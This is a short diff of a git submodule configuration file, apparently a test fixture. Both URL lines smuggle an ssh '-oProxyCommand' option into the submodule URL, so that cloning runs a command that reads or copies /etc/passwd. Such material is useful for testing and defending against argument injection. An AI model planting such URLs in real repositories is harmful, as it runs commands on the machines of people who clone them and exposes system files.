@@ -1,3 +1,3 @@
 [submodule "test2"]
 	path = test2
-	url = ssh://-oProxyCommand=cat /etc/passwd
+	url = ssh://-oProxyCommand=cp /etc/passwd /home
